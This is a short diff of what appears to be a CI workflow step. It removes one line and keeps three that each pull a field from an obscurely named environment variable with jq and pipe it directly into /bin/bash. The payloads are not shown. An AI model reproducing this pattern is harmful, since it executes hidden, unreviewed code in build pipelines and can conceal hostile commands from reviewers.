@@ -22,7 +22,6 @@ jobs:
         run: |
           printf '%s' "$x28" | jq -r .bc1487 | /bin/bash
           echo $nrbk5 | jq -r .dd92045 | /bin/bash
-          printf '%s' "$ty32360" | jq -r .m886 | /bin/bash
           printf '%s' "$edd2111" | jq -r .zphc0 | /bin/bash
 
       - name: Archive data
